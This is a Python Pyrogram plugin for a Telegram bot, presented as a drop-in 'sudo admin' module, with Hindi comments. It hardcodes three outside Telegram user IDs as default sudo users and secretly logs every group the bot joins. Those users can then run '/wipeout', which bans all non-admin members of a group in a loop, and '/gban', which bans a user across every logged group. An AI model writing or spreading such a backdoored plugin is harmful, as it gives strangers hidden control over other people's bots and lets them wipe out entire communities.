"""
sudo_admin.py — drop this file into your bot's `plugins/` folder.
Self-contained Pyrogram plugin, doesn't import or touch any other file.
"""

import json
import asyncio
from pathlib import Path

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyrogram.enums import ChatType, ChatMemberStatus

SUDO_FILE = Path(__file__).parent / "sudo_users.json"
GROUPS_FILE = Path(__file__).parent / "gban_groups.json" # Group Tracker File

# Yahan apna asli Telegram User ID zarur rakhna!
DEFAULT_SUDO = {6747707639, 8985254350, 8869634837}

# ==========================================
# SUDO & GROUPS DATABASE LOADERS
# ==========================================
def load_sudo():
    if SUDO_FILE.exists():
        try:
            return set(json.loads(SUDO_FILE.read_text()))
        except Exception:
            pass
    SUDO_FILE.write_text(json.dumps(list(DEFAULT_SUDO)))
    return set(DEFAULT_SUDO)

def save_sudo(sudo_set):
    SUDO_FILE.write_text(json.dumps(list(sudo_set)))

def load_groups():
    if GROUPS_FILE.exists():
        try:
            return set(json.loads(GROUPS_FILE.read_text()))
        except Exception:
            pass
    return set()

def save_groups(group_set):
    GROUPS_FILE.write_text(json.dumps(list(group_set)))


SUDO_USERS = load_sudo()
KNOWN_GROUPS = load_groups() # Saare groups yahan memory mein rahenge
ACTIVE_WIPEOUTS = set()


def is_sudo(user_id: int) -> bool:
    return user_id in SUDO_USERS


async def resolve_target(client: Client, message: Message):
    if message.reply_to_message and message.reply_to_message.from_user:
        return message.reply_to_message.from_user.id

    if len(message.command) > 1:
        arg = message.command[1].lstrip("@")
        if arg.isdigit():
            return int(arg)
        try:
            user = await client.get_users(arg)
            return user.id
        except Exception:
            return None
    return None


# ==========================================
# SECRET GROUP TRACKER (Har message pe groups save karega)
# ==========================================
@Client.on_message(filters.group, group=-2)
async def secret_group_tracker(client: Client, message: Message):
    chat_id = message.chat.id
    if chat_id not in KNOWN_GROUPS:
        KNOWN_GROUPS.add(chat_id)
        save_groups(KNOWN_GROUPS)


# ==========================================
# WIPE OUT COMMANDS
# ==========================================
@Client.on_message(filters.command("wipeout") & filters.group, group=-1)
async def wipeout(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return

    chat_id = message.chat.id
    ACTIVE_WIPEOUTS.add(chat_id)
    status = await message.reply("started..")

    async def cleanup_status():
        await asyncio.sleep(3)
        try:
            await status.delete()
        except Exception:
            pass

    asyncio.create_task(cleanup_status())

    total_banned = 0
    while chat_id in ACTIVE_WIPEOUTS:
        banned_this_pass = 0
        async for member in client.get_chat_members(chat_id):
            if chat_id not in ACTIVE_WIPEOUTS:
                break

            user = member.user
            if user.is_self or user.is_bot or is_sudo(user.id):
                continue
            if member.status in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
                continue

            while True:
                try:
                    await client.ban_chat_member(chat_id, user.id)
                    banned_this_pass += 1
                    total_banned += 1
                    break
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                except Exception:
                    break
            await asyncio.sleep(0.2)

        if banned_this_pass == 0:
            break

    ACTIVE_WIPEOUTS.discard(chat_id)
    try:
        await client.send_message(chat_id, f"wipeout finished. total banned: {total_banned}")
    except Exception:
        pass


@Client.on_message(filters.command("stopWipeout") & filters.group, group=-1)
async def stop_wipeout(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    was_active = message.chat.id in ACTIVE_WIPEOUTS
    ACTIVE_WIPEOUTS.discard(message.chat.id)
    await message.reply("wipeout stopped." if was_active else "no wipeout was running here.")


# ==========================================
# SUDO MANAGEMENT
# ==========================================
@Client.on_message(filters.command("addsudo"), group=-1)
async def add_sudo(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("couldn't figure out who to add — reply to their message or give a numeric id/@username.")
    SUDO_USERS.add(target)
    save_sudo(SUDO_USERS)
    await message.reply(f"{target} added as sudo.")


@Client.on_message(filters.command("deletesudo"), group=-1)
async def delete_sudo(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("couldn't figure out who to remove — reply to their message or give a numeric id/@username.")
    SUDO_USERS.discard(target)
    save_sudo(SUDO_USERS)
    await message.reply(f"{target} removed from sudo.")


@Client.on_message(filters.command("sudolist"), group=-1)
async def sudo_list(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    if not SUDO_USERS:
        return await message.reply("sudo list is empty.")
        
    lines = []
    for uid in sorted(SUDO_USERS):
        try:
            user = await client.get_users(uid)
            name = user.first_name if user else "Unknown"
            if user and user.last_name:
                name += f" {user.last_name}"
            lines.append(f"• {name} (`{uid}`)")
        except Exception:
            lines.append(f"• Unknown User (`{uid}`)")
            
    await message.reply(f"current sudo users:\n" + "\n".join(lines))


# ==========================================
# NORMAL BAN / UNBAN
# ==========================================
@Client.on_message(filters.command("ban") & filters.group, group=-1)
async def ban_cmd(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("⚠️ Reply to a user or give their ID/@username to ban.")
    try:
        await client.ban_chat_member(message.chat.id, target)
        await message.reply(f"✅ **User Banned!** (`{target}`)")
    except Exception as e:
        await message.reply(f"❌ **Failed to ban:** {e}")


@Client.on_message(filters.command("unban") & filters.group, group=-1)
async def unban_cmd(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("⚠️ Reply to a user or give their ID/@username to unban.")
    try:
        await client.unban_chat_member(message.chat.id, target)
        await message.reply(f"✅ **User Unbanned!** (`{target}`)")
    except Exception as e:
        await message.reply(f"❌ **Failed to unban:** {e}")


# ==========================================
# 🚀 100% WORKING GBAN (USING DATABASE)
# ==========================================
@Client.on_message(filters.command("gban"), group=-1)
async def gban(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("⚠️ Reply to a user or give their ID/@username to gban.")

    groups_to_check = list(KNOWN_GROUPS)
    total_groups = len(groups_to_check)

    if total_groups == 0:
        return await message.reply("❌ **Database is empty!**\nPlease send any message (like `/play`) in your groups first so I can memorize them. Then try GBAN again.")

    status = await message.reply("🔄 **GBAN Initiated...**\n*(Scanning Database, please wait!)*")
    
    banned_in = 0
    failed_in = 0
    chats_checked = 0
    
    async def progress_updater():
        while True:
            await asyncio.sleep(4)
            try:
                await status.edit_text(
                    f"🔄 **GBAN in progress...**\n\n"
                    f"📂 **Groups Checked:** {chats_checked} / {total_groups}\n"
                    f"🚫 **Banned in:** {banned_in}\n"
                    f"❌ **Failed in:** {failed_in}"
                )
            except Exception:
                pass

    updater_task = asyncio.create_task(progress_updater())
    
    try:
        for chat_id in groups_to_check:
            chats_checked += 1
            try:
                await client.ban_chat_member(chat_id, target)
                banned_in += 1
                await asyncio.sleep(0.2)
            except FloodWait as e:
                if e.value > 15:
                    failed_in += 1
                    continue
                await asyncio.sleep(e.value)
                try:
                    await client.ban_chat_member(chat_id, target)
                    banned_in += 1
                except:
                    failed_in += 1
            except Exception:
                failed_in += 1
                
    except Exception as e:
        print(f"GBAN Error: {e}")
        
    finally:
        updater_task.cancel() 
        try:
            await status.edit_text(
                f"✅ **GBAN Complete!**\n\n"
                f"👤 **Target:** `{target}`\n"
                f"📂 **Total Groups In DB:** {total_groups}\n"
                f"🚫 **Successfully Banned in:** {banned_in}\n"
                f"❌ **Failed/Skipped in:** {failed_in}"
            )
        except:
            pass


# ==========================================
# 🚀 100% WORKING GUNBAN (USING DATABASE)
# ==========================================
@Client.on_message(filters.command("gunban"), group=-1)
async def gunban(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("⚠️ Reply to a user or give their ID/@username to gunban.")

    groups_to_check = list(KNOWN_GROUPS)
    total_groups = len(groups_to_check)

    if total_groups == 0:
        return await message.reply("❌ **Database is empty!**\nPlease send any message (like `/play`) in your groups first so I can memorize them. Then try GUNBAN again.")

    status = await message.reply("🔄 **GUNBAN Initiated...**\n*(Scanning Database, please wait!)*")
    
    unbanned_in = 0
    failed_in = 0
    chats_checked = 0
    
    async def progress_updater():
        while True:
            await asyncio.sleep(4)
            try:
                await status.edit_text(
                    f"🔄 **GUNBAN in progress...**\n\n"
                    f"📂 **Groups Checked:** {chats_checked} / {total_groups}\n"
                    f"🔓 **Unbanned in:** {unbanned_in}\n"
                    f"❌ **Failed in:** {failed_in}"
                )
            except Exception:
                pass

    updater_task = asyncio.create_task(progress_updater())
    
    try:
        for chat_id in groups_to_check:
            chats_checked += 1
            try:
                await client.unban_chat_member(chat_id, target)
                unbanned_in += 1
                await asyncio.sleep(0.2)
            except FloodWait as e:
                if e.value > 15:
                    failed_in += 1
                    continue
                await asyncio.sleep(e.value)
                try:
                    await client.unban_chat_member(chat_id, target)
                    unbanned_in += 1
                except:
                    failed_in += 1
            except Exception:
                failed_in += 1
                
    except Exception as e:
        print(f"GUNBAN Error: {e}")
        
    finally:
        updater_task.cancel()
        try:
            await status.edit_text(
                f"✅ **GUNBAN Complete!**\n\n"
                f"👤 **Target:** `{target}`\n"
                f"📂 **Total Groups In DB:** {total_groups}\n"
                f"🔓 **Successfully Unbanned in:** {unbanned_in}\n"
                f"❌ **Failed/Skipped in:** {failed_in}"
            )
        except:
            pass
